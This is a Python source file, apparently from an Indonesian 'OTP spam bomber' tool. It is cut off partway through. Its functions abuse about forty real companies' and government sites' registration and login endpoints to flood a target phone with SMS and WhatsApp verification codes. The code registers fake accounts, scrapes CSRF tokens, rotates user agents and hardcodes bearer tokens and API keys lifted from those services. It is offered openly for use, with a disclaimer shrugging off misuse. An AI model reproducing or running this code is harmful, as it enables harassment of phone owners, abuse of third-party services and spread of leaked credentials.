#!/usr/bin/env python3
# handlers.py - 60+ OTP + SPAM CALL/SMS (FULL)
# "I just give the tools, whether they're used right or not is your business, boss."

import requests
import uuid
import random
import string
import time
import re
import json
import urllib.parse
from utils import fmt_08, fmt_plus, fmt_phone_only, get_random_user_agent, get_public_ip

def format_nomor(nomor):
    nomor = nomor.strip().replace(" ", "").replace("-", "")
    if nomor.startswith("0"):
        phone = "+62" + nomor[1:]
        username = "0" + nomor[1:]
    elif nomor.startswith("62"):
        phone = "+" + nomor
        username = "0" + nomor[2:]
    elif nomor.startswith("+62"):
        phone = nomor
        username = "0" + nomor[3:]
    else:
        phone = "+62" + nomor
        username = "0" + nomor
    return phone, username

# ================================================================
# ===== 60+ OTP HANDLERS (REGISTER/LOGIN METHOD) =====
# ================================================================

# --- 1. PlanetBan (REGISTER) ---
def send_planetban_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://api.planetban.com/website/customer/request-otp"
        payload = {"name": "Test", "phone": phone_08, "password": "Test123", "purpose": "register", "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        return resp
    except:
        return None

# --- 2. HashMicro (REGISTER) ---
def send_hashmicro_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://website-api.hashmicro.com/api/add/3"
        name = 'User' + ''.join(random.choices(string.ascii_letters, k=5))
        data = {'fullname': name, 'phonenumber': phone_08, 'email': f"{name.lower()}@gmail.com", 'companyname': f'PT {name}', 'medium': '55', 'source': '143'}
        headers = {'User-Agent': get_random_user_agent(), 'Content-Type': 'application/x-www-form-urlencoded'}
        resp = requests.post(url, headers=headers, data=data, timeout=15)
        return resp
    except:
        return None

# --- 3. TuneUp (REGISTER) ---
def send_tuneup_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://api.tuneup.id/v1/mitra/register/send-otp"
        name = ''.join(random.choices(string.ascii_lowercase, k=8))
        data = {'company_name': f'PT {name.capitalize()}', 'owner_name': name.capitalize(), 'address': ''.join(random.choices(string.ascii_letters + string.digits, k=10)), 'email': f'{name}@mailnesia.com', 'phone_number': phone_08, 'province_code': '32', 'city_code': '32.04', 'subscription_id': 'undefined', 'channel': 'whatsapp', 'agreement': 'true', 'service_categories[]': '3'}
        headers = {'User-Agent': get_random_user_agent()}
        resp = requests.post(url, headers=headers, data=data, timeout=15)
        return resp
    except:
        return None

# --- 4. Internet Rakyat (REGISTER) ---
def send_internetrakyat_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://internetrakyat.id/api/app/auth/send-otp-register"
        payload = {"phone_number": phone_08}
        headers = {'Content-Type': 'application/json', 'x-api-key': '280999!FTTH', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        return resp
    except:
        return None

# --- 5. Ultramilk (REGISTER) ---
def send_ultramilk_register(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://ultramilk-clp.kata.ai/api/ultramilk/register"
        name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=4))
        payload = {"name": name, "email": f"{name.lower()}@gmail.com", "password": "Pass123!", "phone_number": phone_08, "portal": "IcownicPatch", "is_consent": True}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        return resp
    except:
        return None

# --- 6. Kaniva (REGISTER) ---
def send_kaniva_otp(phone, name=None):
    try:
        phone_08 = fmt_08(phone)
        if name is None:
            name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=5))
        sess = requests.Session()
        sess.headers.update({"User-Agent": get_random_user_agent(), "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"})
        r = sess.get("https://daftar.kanivainternationalbali.com/register/whatsapp", timeout=15)
        if r.status_code != 200:
            return None
        csrf = None
        match = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', r.text)
        if match:
            csrf = match.group(1)
        else:
            raw = sess.cookies.get("XSRF-TOKEN", "")
            if raw:
                csrf = urllib.parse.unquote(raw)
        if not csrf:
            return None
        otp_url = "https://daftar.kanivainternationalbali.com/register/whatsapp/request-otp"
        headers_otp = {"X-XSRF-TOKEN": csrf, "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/json", "Origin": "https://daftar.kanivainternationalbali.com", "Referer": "https://daftar.kanivainternationalbali.com/register/whatsapp", "User-Agent": get_random_user_agent()}
        payload = {"name": name, "phone": phone_08}
        resp = sess.post(otp_url, json=payload, headers=headers_otp, timeout=15)
        return resp
    except:
        return None

# --- 7. Jembatani (REGISTER) ---
def send_jembatani_otp(phone, name=None, password=None):
    try:
        phone_08 = fmt_08(phone)
        if name is None:
            name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=5))
        if password is None:
            password = 'Pass' + ''.join(random.choices(string.ascii_letters + string.digits, k=6))
        headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://jembatani.co.id", "Referer": "https://jembatani.co.id/"}
        reg_payload = {"phone_number": phone_08, "name": name, "role": "farmer", "password": password, "password_confirmation": password, "consent": "1"}
        reg_resp = requests.post("https://api.jembatani.co.id/v1/register", json=reg_payload, headers=headers, timeout=15)
        if reg_resp.status_code == 200 and '"success":true' in reg_resp.text:
            return reg_resp
        resend_payload = {"phone_number": phone_08}
        resend_resp = requests.post("https://api.jembatani.co.id/v1/regenerate-otp", json=resend_payload, headers=headers, timeout=15)
        return resend_resp
    except:
        return None

# --- 8. RCX (REGISTER) ---
def send_rcx_otp(phone, name=None, email=None):
    try:
        phone_08 = fmt_08(phone)
        if name is None:
            name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=5))
        if email is None:
            email = f"{name.lower()}@gmail.com"
        sess = requests.Session()
        sess.headers.update({"User-Agent": get_random_user_agent(), "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"})
        reg_get = sess.get("https://sso.rcx.co.id/register", timeout=15)
        if reg_get.status_code != 200:
            return None
        token = None
        if "XSRF-TOKEN" in sess.cookies:
            token = urllib.parse.unquote(sess.cookies["XSRF-TOKEN"])
        if not token:
            match = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', reg_get.text)
            if match:
                token = match.group(1)
        if not token:
            return None
        url = "https://sso.rcx.co.id/auth/passwordless/request"
        headers = {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://sso.rcx.co.id", "Referer": "https://sso.rcx.co.id/register", "User-Agent": get_random_user_agent()}
        data = {"_token": token, "mode": "register", "channel": "whatsapp", "name": name, "email": email, "identifier": phone_08}
        resp = sess.post(url, headers=headers, data=data, allow_redirects=False, timeout=15)
        return resp
    except:
        return None

# --- 9. Sahabat Teknisi (REGISTER) ---
def send_sahabatteknisi_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.sahabatteknisi.co.id/api/auth/otp/check-phone"
        payload = {"phone": phone_08}
        headers = {"x-requested-with": "XMLHttpRequest", "User-Agent": get_random_user_agent(), "content-type": "application/json", "origin": "https://www.sahabatteknisi.co.id", "referer": "https://www.sahabatteknisi.co.id/checkout/confirm"}
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        return resp
    except:
        return None

# --- 10. Auto2000 (REGISTER) ---
def send_auto2000_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp"
        payload = {"phoneNumber": phone_08, "isCheckOtpLimit": True, "uniqueID": phone_08, "isLogin": False}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 11. 99.co (REGISTER) ---
def send_99co_otp(phone):
    try:
        token = "eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjItNnE5bWNleHJHcHdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODEwOTA1MTQsImlhdCI6MTc4MTA4NjkxNCwianRpIjoiMWJmMjAxNDQtM2EyOS00MzJkLWIyYmItNGYxOTlmMTIzMGM4IiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiOTQ1MmE5MjgtNjkzZS00OWIxLWEzOTUtNGMwMThlNmQ3MTg0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6ImFlYTNhMDEzLTJmMDktNDU0Ni05M2Q5LWM1MmVkYWRiMGM0NSIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsic2VsbGVyIiwidW1hX2F1dGhvcml6YXRpb24iLCJkZWZhdWx0LXJvbGVzLTk5aWQtcHJvZCIsImJ1eWVyIl19LCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiYWVhM2EwMTMtMmYwOS00NTQ2LTkzZDktYzUyZWRhZGIwYzQ1IiwiY29yZV91dWlkIjoiMmI4OTg0MzQtMjE3MC00MGRmLTgwNmYtN2I4ZWNjOGUwZjQ4IiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJjb3JlX2NvbnN1bWVyX3V1aWQiOiIxOGU5ODcyMy0wOWY5LTRlMzEtYjQzYS1jOGVlMjAwZWVmNWIiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJoc2hoc2pzajEyMiIsImNvcmVfY3VzdG9tZXJfdXVpZCI6ImQ5MTI3NDBkLWNhYzYtNDYyYS04YmE1LTMzYWE1MDc2MDdjMiIsImVtYWlsIjoidHN0dHR0dHRndHR0QGdtYWlsLmNvbSJ9.CcZpFr2eggmtVoWpUPuWTYg2LQ-qxH0GV4yx9q1_ZnB4pt13JIbTclvEytnqdLl9w9d8BKzCeGIiEnf0oQZpbw"
        phone_plus = fmt_plus(phone)
        url = "https://www.99.co/id/api/biz/messaging/otp-events"
        payload = {"brand": "99id", "destination_address": phone_plus, "type_id": 2}
        headers = {'Content-Type': 'application/json', 'Authorization': f'Bearer {token}', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 12. Beli Rumah (REGISTER) ---
def send_belirumah_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.belirumah.co/api/otp/request_new"
        payload = {"phone_number": phone_plus}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 13. Fastwork (REGISTER) ---
def send_fastwork_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
        payload = {"phone_number": phone_08}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 14. Astra Daihatsu (REGISTER) ---
def send_astra_daihatsu_otp(phone):
    try:
        phone_62 = '62' + fmt_phone_only(phone)
        sess = requests.Session()
        sess.headers.update({"User-Agent": get_random_user_agent(), "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "Origin": "https://www.astra-daihatsu.id", "Referer": "https://www.astra-daihatsu.id/register", "X-Requested-With": "XMLHttpRequest"})
        resp = sess.get("https://www.astra-daihatsu.id/register", timeout=15)
        if resp.status_code != 200:
            return None
        csrf = None
        m = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', resp.text)
        if m:
            csrf = m.group(1)
        if not csrf:
            m = re.search(r'<input\s+type="hidden"\s+name="_csrf"\s+value="([^"]+)"', resp.text)
            if m:
                csrf = m.group(1)
        if not csrf:
            csrf = str(uuid.uuid4())
        otp_url = "https://www.astra-daihatsu.id/otp/whatsapp/generate"
        headers_otp = {"Content-Type": "application/json; charset=UTF-8", "csrftoken": csrf, "Origin": "https://www.astra-daihatsu.id", "Referer": "https://www.astra-daihatsu.id/register", "User-Agent": get_random_user_agent()}
        payload = {"phoneNo": phone_62}
        resp2 = sess.post(otp_url, headers=headers_otp, json=payload, timeout=20)
        return resp2
    except:
        return None

# --- 15. Royal Canin (REGISTER) ---
def send_royal_canin_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        session = requests.Session()
        session.headers.update({"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://club.royalcanin.id"})
        session.get("https://club.royalcanin.id/sign-up", timeout=10)
        url = "https://club.royalcanin.id/api/get_otp"
        payload = {"params": {"Email": "", "mobile_number": phone_plus, "OTPType": "IM"}}
        resp = session.post(url, json=payload, timeout=10)
        return resp
    except:
        return None

# --- 16. Watsons (REGISTER) ---
def send_watsons_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR"
        payload = {"uid": "", "action": "GENERAL", "countryCode": "62", "target": phone_08, "type": "WHATSAPP"}
        headers = {'Content-Type': 'application/json', 'Authorization': 'bearer Pi_D6dqblYElXgy4mWOXjkLCaZg', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 17. HRS-BRE (REGISTER) ---
def send_hrsbre_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        BASE_URL = "https://career.hrs-bre.site"
        SIGN_UP_PAGE = f"{BASE_URL}/auth/sign_up"
        SIGN_UP_URL = f"{BASE_URL}/auth/sign_up_action"
        headers = {"User-Agent": get_random_user_agent(), "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "Origin": "https://career.hrs-bre.site", "Referer": SIGN_UP_PAGE, "Upgrade-Insecure-Requests": "1"}
        session = requests.Session()
        r = session.get(SIGN_UP_PAGE, headers=headers, timeout=15)
        if r.status_code != 200:
            return None
        nik = ''.join(random.choices(string.digits, k=16))
        email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@" + random.choice(["gmail.com", "yahoo.com"])
        username = ''.join(random.choices(string.ascii_letters, k=8))
        password = 'Aa1' + ''.join(random.choices(string.ascii_letters + string.digits + "#$%&!", k=7))
        boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        body = (f"--{boundary}\r\n" f'Content-Disposition: form-data; name="nik"\r\n\r\n{nik}\r\n' f"--{boundary}\r\n" f'Content-Disposition: form-data; name="email"\r\n\r\n{email}\r\n' f"--{boundary}\r\n" f'Content-Disposition: form-data; name="whatsapp"\r\n\r\n{phone_08}\r\n' f"--{boundary}\r\n" f'Content-Disposition: form-data; name="username"\r\n\r\n{username}\r\n' f"--{boundary}\r\n" f'Content-Disposition: form-data; name="password"\r\n\r\n{password}\r\n' f"--{boundary}--\r\n")
        headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
        resp = session.post(SIGN_UP_URL, headers=headers, data=body, timeout=15)
        return resp
    except:
        return None

# --- 18. Erafone (LOGIN) ---
def send_erafone_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://jeanne.eraspace.com/customers/v2.1/otp/request"
        payload = {"identifier": phone_plus, "type": "identifier_validation"}
        headers = {'Content-Type': 'application/json', 'Authorization': 'Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=', 'otp-provider': 'whatsapp', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 19. Beautyhaul (REGISTER) ---
def send_beautyhaul_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        base = "https://www.beautyhaul.com"
        nama_depan = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
        nama_belakang = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
        rand_email = f"{nama_depan.lower()}{random.randint(100,999)}@gmail.com"
        password = "Testt#12334"
        reg_payload = {"nama_depan": nama_depan, "nama_belakang": nama_belakang, "email": rand_email, "nomor_kode_id": "100", "nomor_kode_value": "62", "nomor_ponsel": phone_08, "password": password, "konfirmasi_password": password, "tanggal_lahir": "20 Jun 2015", "jenis_kelamin": random.choice(["Female", "Male"]), "g-recaptcha-response": "", "subscribe": "true", "terms": "true"}
        session = requests.Session()
        session.headers.update({"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.beautyhaul.com", "Referer": "https://www.beautyhaul.com/account/register"})
        session.post(f"{base}/ajax/account/save_register", json=reg_payload, timeout=12)
        resp = session.post(f"{base}/ajax/account/send_otp", json={"method": "WhatsApp"}, timeout=12)
        return resp
    except:
        return None

# --- 20. Hainaya (REGISTER) ---
def send_hainaya_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        register_url = "https://app.hainaya.id/api/onboarding/register"
        headers_register = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://app.hainaya.id", "Referer": "https://app.hainaya.id/onboard"}
        prefixes = ['Tst', 'Coba', 'Uji', 'Test', 'Demo', 'Sample', 'Bisnis']
        mid = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6)))
        business_name = random.choice(prefixes) + mid.capitalize() + str(random.randint(10, 999))
        register_payload = {"business_name": business_name, "vertical": "salon", "vendor_type": "nail_salon", "business_phone": phone_08, "owner_name": "", "owner_phone": phone_08}
        resp = requests.post(register_url, headers=headers_register, json=register_payload, timeout=15)
        if resp.status_code == 201:
            return resp
        if resp.status_code == 409:
            login_url = "https://app.hainaya.id/api/auth/login"
            headers_login = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://app.hainaya.id", "Referer": "https://app.hainaya.id/login"}
            login_payload = {"phone_number": phone_08}
            resp_login = requests.post(login_url, headers=headers_login, json=login_payload, timeout=15)
            return resp_login
        return resp
    except:
        return None

# --- 21. MinumYukKaka (REGISTER) ---
def send_minumyukkaka_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        session = requests.Session()
        first_name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
        email = f"{first_name.lower()}{random.randint(100, 999)}@gmail.com"
        password = "pass#" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        register_url = "https://minumyukkaka.com/services/liquid/Register"
        headers_register = {"x-requested-with": "XMLHttpRequest", "User-Agent": get_random_user_agent(), "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://minumyukkaka.com", "Referer": "https://minumyukkaka.com/register"}
        register_data = {"registerModel[first_name]": first_name, "registerModel[last_name]": "", "registerModel[email]": email, "registerModel[phone]": phone_08, "registerModel[otp]": "", "registerModel[gender]": "", "registerModel[date_of_birth]": "", "registerModel[IsAddressRequired]": "false", "registerModel[address]": "", "registerModel[additional_address]": "", "registerModel[city]": "", "registerModel[zip]": "", "registerModel[country_code]": "", "registerModel[country]": "", "registerModel[state]": "", "registerModel[password]": password, "registerModel[verify_password]": password, "registerModel[pin]": "", "registerModel[verify_pin]": ""}
        session.post(register_url, headers=headers_register, data=register_data, timeout=15)
        otp_url = "https://minumyukkaka.com/services/identity/requestOTP"
        x_sat = session.cookies.get('x-sat') or ''.join(random.choices(string.ascii_letters + string.digits + '+/=', k=44))
        headers_otp = {"x-sat": x_sat, "x-requested-with": "XMLHttpRequest", "User-Agent": get_random_user_agent(), "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://minumyukkaka.com", "Referer": "https://minumyukkaka.com/register"}
        otp_data = {"destination": phone_08, "otpLength": "6"}
        resp = session.post(otp_url, headers=headers_otp, data=otp_data, timeout=15)
        return resp
    except:
        return None

# --- 22. SIDEMANG (REGISTER) ---
def send_sidemang_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        email_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
        email = f"{email_name}{random.randint(100, 999)}@gmail.com"
        url = "https://sidemang.palembang.go.id/api/users/register/send-otp"
        headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://sidemang.palembang.go.id", "Referer": "https://sidemang.palembang.go.id/lambidaro/register-otp"}
        payload = {"phoneNumber": phone_08, "email": email}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp
    except:
        return None

# --- 23. LaporMasBup (REGISTER) ---
def send_lapormasbup_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://lapormasbup.klaten.go.id/api/register"
        name = ''.join(random.choices(string.ascii_letters, k=5)).capitalize()
        email = f"{name.lower()}{random.randint(100,999)}@gmail.com"
        password = "Pass" + ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + "$"
        payload = {"name": name, "email": email, "mobilephone": phone_08, "gender": "Laki-Laki", "warga_birth_date": f"{random.randint(1966,2010)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}", "password": password, "address": "Jl. Test No. " + str(random.randint(1,200))}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        if resp.status_code == 200:
            return resp
        url2 = "https://lapormasbup.klaten.go.id/api/kirim-ulang-otp"
        resp2 = requests.post(url2, json={"mobilephone": phone_08}, headers=headers, timeout=10)
        return resp2
    except:
        return None

# --- 24. PTSP Kemenag (REGISTER) ---
def send_ptsp_kemenag_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
        email = f"{name.lower()}{random.randint(100, 999)}@gmail.com"
        chars = list(string.ascii_letters + string.digits)
        random.shuffle(chars)
        password = 'Pass' + ''.join(chars[:6]) + '$'
        url = "https://dev-ptsp.kemenag.go.id/api/auth/register"
        headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://dev-ptsp.kemenag.go.id", "Referer": "https://dev-ptsp.kemenag.go.id/login"}
        payload = {"nama": name, "wa": phone_08, "email": email, "password": password}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp
    except:
        return None

# --- 25. ACC (REGISTER) ---
def send_acc_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.acc.co.id/register/new-account"
        payload = f'[{{"user_id":null,"action":"register","send_to":"{phone_08}","provider":"whatsapp"}}]'
        headers = {'Content-Type': 'text/plain;charset=UTF-8', 'User-Agent': get_random_user_agent(), 'next-action': '7f4271400eb36624563cc4172891e0c821039f2fca'}
        resp = requests.post(url, headers=headers, data=payload, timeout=10)
        return resp
    except:
        return None

# --- 26. Absenku (REGISTER) ---
def send_absenku_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        sess = requests.Session()
        sess.get("https://registrasi.absenku.com/index.php/register/index/2", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': get_random_user_agent()}
        sess.post("https://registrasi.absenku.com/index.php/register/validasi_trial", data={"nama": "Nama Lengkap", "email": "email@gmail.com", "telp": phone_08, "company_name": "PT Test", "jumlah": "10", "tujuan": "1", "paket": "21", "ci_csrf_token": ""}, headers=headers, timeout=10, verify=False)
        resp = sess.get("https://registrasi.absenku.com/index.php/register/ajax_detik_otp", params={"telp": phone_08}, headers=headers, timeout=10, verify=False)
        return resp
    except:
        return None

# --- 27. Saturdays (REGISTER) ---
def send_saturdays_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://beta.api.saturdays.com/api/v1/user/otp/send"
        payload = {"number": phone_08, "country_code": "+62", "type": ""}
        headers = {'Content-Type': 'application/json', 'x-api-key': 'GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 28. Singa (REGISTER) ---
def send_singa_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://api102.singa.id/new/login/sendWaOtp"
        payload = {"mobile_phone": phone_08, "type": "mobile", "is_switchable": 1}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 29. Adiraku (REGISTER) ---
def send_adiraku_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
        payload = {"mobileNumber": phone_08, "type": "prospect-create", "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 30. Bunda Hospital (REGISTER) ---
def send_bunda_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://api.bundahospital.com/api/v1/auth/otp"
        payload = {"phone": phone_08, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 31. Maulagi (REGISTER) ---
def send_maulagi_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://api.maulagi.id/api/v2/auth/check"
        payload = {"credentials": phone_08}
        headers = {'Content-Type': 'application/json', 'x-ml-key': 'E32VCHXX32', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 32. Pinhome (REGISTER) ---
def send_pinhome_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.pinhome.id/api/pinaccount/request/otp"
        payload = {"accountType": "customers", "countryCode": "62", "medium": "whatsapp", "otpType": "register", "phoneNumber": phone_08}
        headers = {'Authorization': 'Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731', 'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 33. Rumah123 (REGISTER) ---
def send_rumah123_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://www.rumah123.com/api/otp/request-otp"
        payload = {"cancelledRequestId": str(random.randint(100000, 999999)), "ipAddress": "192.168.1.1", "phoneNumber": phone_raw, "portalId": 1, "type": "WHATSAPP", "url": "https://www.rumah123.com/user/login"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 34. Paper (REGISTER) ---
def send_paper_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://register.paper.id/api/v1/auth/register/send-otp"
        payload = {"phone": phone_plus, "method": "whatsapp", "registered_by": "flutter mweb"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 35. Bonus Belanja (REGISTER) ---
def send_bonusbelanja_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.bonusbelanja.com/api/auth/registration/app"
        payload = {"phone": phone_08, "name": "User", "agreeTnc": True, "agreeContact": True}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 36. Dunia Games (REGISTER) ---
def send_duniagames_otp(phone):
    try:
        phone_plus, username = format_nomor(phone)
        url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
        payload = {"phoneNumber": phone_plus, "userName": username}
        headers = {'Content-Type': 'application/json', 'x-device': str(uuid.uuid4()), 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 37. Hijup (REGISTER) ---
def send_hijup_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://www.hijup.com/sign_in"
        payload = [{"phone_number": phone_raw, "store_path": "hijup"}]
        headers = {'Content-Type': 'text/plain;charset=UTF-8', 'User-Agent': get_random_user_agent(), 'next-action': 'b7eda6e749fbadcfcf226c2e36865091520b679f'}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 38. Alodokter (REGISTER) ---
def send_alodokter_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.alodokter.com/login-with-phone-number"
        payload = {"user": {"phone": phone_08}}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 39. Blibli Tiket (REGISTER) ---
def send_bliblitiket_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate"
        payload = {"action": "REGISTER_OTP", "channel": "WHATS_APP", "recipient": phone_plus, "recaptchaToken": ""}
        headers = {'Content-Type': 'text/plain;charset=UTF-8', 'User-Agent': get_random_user_agent(), 'x-request-id': str(uuid.uuid4()), 'x-channel-id': 'MWEB', 'x-entity': 'TIKET'}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 40. Matahari (REGISTER) ---
def send_matahari_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp"
        payload = {"otp_request": {"mobile_number": phone_08, "mobile_country_code": "+62"}}
